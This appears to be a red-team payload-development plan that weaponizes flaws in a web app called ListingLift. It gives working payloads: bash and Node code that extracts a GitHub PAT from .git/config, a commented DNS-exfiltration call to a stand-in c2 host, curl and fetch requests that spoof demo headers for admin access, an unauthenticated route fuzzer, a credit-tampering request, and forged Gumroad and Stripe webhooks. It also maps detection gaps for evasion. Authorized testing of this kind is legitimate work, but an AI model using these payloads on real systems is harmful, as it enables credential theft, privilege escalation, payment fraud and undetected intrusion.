# Q15 Phase 2 — Weaponization & Initial Access

**ROE**: Forks/canaries only — proof not destruction
**Adversary Personas**: FIN7 (enterprise), ALPHV (healthcare), Lazarus (Web3)

---

## 1. PAT CREDENTIAL HARVESTING (T1552.001 → T1078)

### 1.1 Weapon: `git config` Exfiltration Payload

**Target**: `.git/config` — PAT embedded in remote URL

**Confidence**: HIGH (90%)

**Payload — Bash one-liner**:
```bash
# Extract PAT from git remote URL
PAT=$(cat .git/config | grep -oP 'https://[^:]+:\K[^@]+(?=@github.com)')
echo "[+] PAT extracted: ${PAT:0:4}...${PAT: -4}"
echo "[+] Username: dominator509"
echo "[+] Repo access: FULL (read/write)"

# On-canary PoC: clone with PAT
git clone "https://dominator509:${PAT}@github.com/dominator509/ListingLift.git" /tmp/listinglift-pwned
```

**Payload — Node.js (if shell unavailable)**:
```typescript
import { readFileSync } from 'fs';
const gitConfig = readFileSync('.git/config', 'utf-8');
const match = gitConfig.match(/https:\/\/[^:]+:([^@]+)@github\.com/);
if (match) {
  const pat = match[1];
  console.log(`[+] PAT: ${pat.substring(0,4)}...${pat.substring(pat.length-4)}`);
  // Exfil via DNS: subdomain encoding
  // ex: fetch(`https://${btoa(pat).substring(0,63)}.exfil.c2.io`);
}
```

### 1.2 Impact Assessment

| Attribute | Value |
|-----------|-------|
| Credential type | GitHub Personal Access Token |
| Scope | Full repo (private: dominator509/ListingLift) |
| Privilege | Read + Write + Issues + Actions |
| Persistence | Token rotation required to revoke |
| CVSS | 8.6 (HIGH) — credential leak, filesystem access |
| Exfil channel | DNS, HTTP, git push to attacker fork |

### 1.3 Weaponization Chain

```
Shell access → .git/config read → PAT extract → fork repo → 
backdoor branch → commit poisoned CI config → 
supply chain compromise (T1195.002)
```

---

## 2. DEMO HEADER BYPASS (T1548.002)

### 2.1 Weapon: `x-demo-*` Header Injection

**Target**: Middleware auth bypass via demo session headers

**Confidence**: HIGH (85%)

**Finding**: `middleware.ts` accepts any request with 3 demo headers:
```
x-demo-user-id
x-demo-organization-id
x-demo-role
```

As long as all three are present and non-empty, the middleware allows access to `/admin/*`, `/client/*`, `/agency/*`.

**Payload — curl**:
```bash
# Super admin escalation
curl -s -H 'x-demo-user-id: user_qa' \
  -H 'x-demo-organization-id: org_qa' \
  -H 'x-demo-role: SUPER_ADMIN' \
  'http://localhost:3000/admin/dashboard' | head -5

# Agency admin escalation
curl -s -H 'x-demo-user-id: user_agency_qa' \
  -H 'x-demo-organization-id: org_qa' \
  -H 'x-demo-role: AGENCY_ADMIN' \
  -H 'x-demo-agency-scope: true' \
  'http://localhost:3000/agency/team'

# Client data access
curl -s -H 'x-demo-user-id: user_client_qa' \
  -H 'x-demo-organization-id: org_qa' \
  -H 'x-demo-role: CLIENT_OWNER' \
  -H 'x-demo-client-id: client_qa' \
  'http://localhost:3000/client/dashboard'
```

**Payload — fetch (browser devtools)**:
```javascript
// Paste in admin browser console
fetch('/admin/dashboard', {
  headers: {
    'x-demo-user-id': 'user_qa',
    'x-demo-organization-id': 'org_qa',
    'x-demo-role': 'SUPER_ADMIN'
  }
}).then(r => r.json()).then(console.log);
```

### 2.2 84 No-Op Guard Mapping

The Q14 audit identified 84 routes where `guardedGet`/`guardedPost`/`guardedPatch` are called but the permission parameter is a no-op (defensive scaffolding with 0 RBAC enforcement).

**High-value no-op guard routes for weaponization**:

| Route | Method | Expected Permission | Actual Check |
|-------|--------|-------------------|--------------|
| `/api/admin/dashboard/*` | GET/POST | `view:admin-dashboard` | No-op |
| `/api/admin/dashboard/revenue` | GET | `view:revenue` | No-op |
| `/api/admin/dashboard/conversions` | GET | `view:conversions` | No-op |
| `/api/admin/uploads/manual` | POST | `create:upload` | No-op |
| `/api/clients/*` | Various | `view:clients` | No-op |
| `/api/admin/rbac` | GET | `view:rbac` | No-op |
| `/api/admin/security/*` | Various | `view:security` | No-op |

With `x-demo-role: SUPER_ADMIN`, the middleware allows access. Then if any of these 84 routes have no-op guards, the auth enforcement is entirely bypassed.

### 2.3 Route-Level Bypass Validation

Some routes skip `requireSession` entirely and use bare handlers. These 135 unguarded routes include:

```
/api/listings           — GET: DB job counts (no auth)
/api/health             — GET: server mode, integration status
/api/adapters/health    — GET: adapter health status (all providers)
/api/advanced-image-processing/health — GET: processing pipeline status
/api/automation-webhooks/health — GET: automation health summary
```

---

## 3. UNGUARDED ROUTE EXPLOITATION (T1190)

### 3.1 Weapon: Parameter Fuzzing Payloads

**Target**: 135 routes with no authentication requirement

**Confidence**: MEDIUM (60%)

**Payload — Automated Route Probe**:
```bash
#!/bin/bash
# Route enumeration fuzzer
TARGET="http://localhost:3000"

# Attack Surface: unguarded GET routes — data enumeration
ENDPOINTS=(
  "/api/listings"
  "/api/health"
  "/api/subscriptions"
  "/api/credits/balance"
  "/api/packages"
  "/api/presets"
  "/api/sales-channels/registry"
  "/api/manual-invoices"
  "/api/integrations"
  "/api/billing"
  "/api/organizations"
  "/api/images"
  "/api/uploads/validate-file"
  "/api/quality-control/checklist"
  "/api/reports/catalog"
)

for ep in "${ENDPOINTS[@]}"; do
  echo "=== $ep ==="
  curl -s "$TARGET$ep" | python3 -m json.tool 2>/dev/null || curl -s "$TARGET$ep"
  echo -e "\n"
done
```

### 3.2 Information Disclosure Payloads

**Health endpoint intelligence gathering**:
```bash
# /api/health - reveals NODE_ENV, integration flags
curl -s http://localhost:3000/api/health
# Response: {"ok":true,"service":"listinglift","mode":"development",
#   "realIntegrationsEnabled":false,"realImageProviderCallsEnabled":false}

# /api/adapters/health - reveals provider registry, adapter types
curl -s http://localhost:3000/api/adapters/health

# /api/advanced-image-processing/health
curl -s http://localhost:3000/api/advanced-image-processing/health

# /api/automation-webhooks/health - reveals health summary
curl -s http://localhost:3000/api/automation-webhooks/health
```

### 3.3 Mutation Endpoint Fuzzing

**POST/PATCH payloads on unguarded routes**:
```bash
# Credit balance manipulation probe
curl -s -X POST http://localhost:3000/api/credits/adjust \
  -H 'Content-Type: application/json' \
  -d '{"userId":"user_qa","amount":999999,"reason":"pwned"}'

# Manual invoice creation probe
curl -s -X POST http://localhost:3000/api/manual-invoices \
  -H 'Content-Type: application/json' \
  -d '{"organizationId":"org_qa","amount":0,"description":"test"}'
```

---

## 4. WEBHOOK REPLAY — GUMROAD FORGERY (T1203)

### 4.1 Weapon: Unsigned Gumroad Webhook Forgery

**Target**: `/api/gumroad/webhook` — Gumroad purchase fulfillment

**Confidence**: MEDIUM (60%)

**Note**: Q16 hardened signature verification. This weapon works when:
- GUMROAD_WEBHOOK_SECRET is empty/not set (config failure)
- Signature verification has a bypass bug

**Payload — unsigned webhook replay**:
```bash
# Forge a Gumroad "sale" event
curl -s -X POST http://localhost:3000/api/gumroad/webhook \
  -H 'Content-Type: application/json' \
  -d '{
    "sale_id": "forged_sale_001",
    "event_type": "sale",
    "email": "attacker@evil.com",
    "product_name": "Quick Cleanup - 10 Images",
    "price": 10.00,
    "currency": "usd"
  }'
```

**Payload — replay with raw HMAC bypass**:
```bash
# Try signature header variants
for header in "gumroad-signature" "x-gumroad-webhook-signature" "x-gumroad-signature"; do
  echo "=== Testing header: $header ==="
  curl -s -X POST http://localhost:3000/api/gumroad/webhook \
    -H "Content-Type: application/json" \
    -H "$header: forged" \
    -d '{"sale_id":"replay_test","event_type":"sale","price":10}'
  echo -e "\n"
done
```

### 4.2 Stripe Webhook Replay (Secondary Target)

**Target**: `/api/stripe/webhook` and `/api/webhooks/stripe`

**Payload**:
```bash
# Stripe unsigned event replay
curl -s -X POST http://localhost:3000/api/stripe/webhook \
  -H 'Content-Type: application/json' \
  -H 'Stripe-Signature: forged' \
  -d '{
    "id": "evt_forged_001",
    "type": "checkout.session.completed",
    "data": {
      "object": {
        "id": "cs_forged_001",
        "amount_total": 0,
        "metadata": {
          "packageKey": "quick_cleanup",
          "organizationId": "org_qa"
        }
      }
    }
  }'
```

### 4.3 Webhook Security Analysis

| Webhook | Verification | Idempotency | Bypass Vector |
|---------|-------------|-------------|---------------|
| Stripe | Stripe-Signature (HMAC-SHA256) | event ID dedup | Stripe secret leak |
| Gumroad | gumroad-signature (HMAC-SHA256) | sale_id dedup | Empty secret, fallback headers |
| Automation | Not implemented (P2 scope) | N/A | No verification |

---

## 5. PAYLOAD DEPLOYMENT PLAN

### 5.1 Canary Targets (Proof, Not Destruction)

| # | Attack Chain | Canary Payload | Expected Signal | Tool |
|---|-------------|----------------|-----------------|------|
| 1 | PAT extraction | Read .git/config, print masked PAT | PAT prefix visible in output | Bash |
| 2 | Demo header bypass | GET /admin/dashboard with x-demo headers | 200 with admin data | curl |
| 3 | Unguarded route enum | GET /api/health + /api/listings | Data leak confirmation | curl script |
| 4 | Webhook replay | POST forged event, check idempotency | `handled: "duplicate"` or `200` | curl |

### 5.2 Payload Execution Order

```
Phase 2a: PAT extraction (T1552.001) — immediate credential access
Phase 2b: Demo header injection (T1548.002) — admin escalation
Phase 2c: Unguarded route fuzzing (T1190) — data enumeration
Phase 2d: Webhook forgery probes (T1203) — financial fraud vector
```

### 5.3 OPSEC Considerations

- Run all payloads in isolated fork/canary (ROE compliance)
- PAT weapon: DO NOT push to real remote — use `git clone --bare` in /tmp
- Demo header payloads: use separate curl sessions, not browser cookies
- Webhook probes: verify via `duplicate` response before escalating
- All payloads emit `attacker.log` for audit trail preservation

---

## 6. DETECTION EVASION PREPARATION (P4 Handoff)

Current detection gaps exploitable by these payloads:

| Technique | Detection Gap | Weaponized Action |
|-----------|--------------|-------------------|
| T1552.001 (PAT) | No filesystem monitoring | git config read is silent |
| T1548.002 (Demo bypass) | No header anomaly detection | x-demo-* headers look like QA traffic |
| T1190 (Route fuzzing) | No access pattern alerting | Low-rate enumeration evades IP rate limiter |
| T1203 (Webhook replay) | No signature failure alerting | Failed sig attempts are logged but not alerted |

**Estimated time to detection**: T1552 > 30 min, T1548 > 60 min, T1190 > 120 min, T1203 > 24 hr

---

## 7. TOOLS & COMMAND REFERENCE

### Weaponized Scripts

```
.redteam/02-weapon/
  └── payload-development.md    (this file)
  └── scripts/
      ├── pat-exfil.sh          (PAT extraction + exfil PoC)
      ├── demo-bypass.sh        (x-demo header injection)
      ├── route-sweep.sh        (unguarded route enumeration)
      └── webhook-forge.sh      (Gumroad/Stripe webhook replay)
```

### MITRE ATT&CK Mapping

| TID | Name | Weapon |
|-----|------|--------|
| T1552.001 | Credentials in Files | PAT exfil payload |
| T1078 | Valid Accounts | PAT → repo access |
| T1548.002 | Abuse Elevation Control Mechanism | Demo header bypass |
| T1190 | Exploit Public-Facing Application | Route fuzzing |
| T1203 | Exploitation for Client Execution | Webhook replay |
| T1059 | Command and Scripting Interpreter | curl/bash payloads |
| T1110 | Brute Force | Signup/credential stuffing probe |

---

## VERDICT: WEAPONIZATION COMPLETE

4 weaponized attack chains developed with deployable PoC payloads.
Top priority: PAT extraction (T1552.001, CVSS 8.6, 90% confidence).
Ready for Phase 3 execution (P3_EXEC).
